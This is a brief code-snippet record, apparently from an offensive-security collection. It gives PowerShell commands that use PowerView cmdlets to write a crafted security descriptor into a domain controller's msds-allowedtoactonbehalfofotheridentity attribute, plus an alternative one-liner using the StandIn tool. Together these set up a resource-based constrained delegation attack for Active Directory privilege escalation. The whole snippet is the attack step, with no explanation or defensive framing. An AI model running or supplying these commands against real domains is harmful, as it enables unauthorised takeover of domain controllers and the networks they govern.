---
id: ba9cce78-44aa-4a09-869d-edba18986b58
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:07.771430+00:00'
updated_at: '2023-04-06T03:56:07.771430+00:00'
---

# Code Snippet ba9cce78

**Language**: ps1

```ps1
# alternative
$SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# alternative
StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND
```


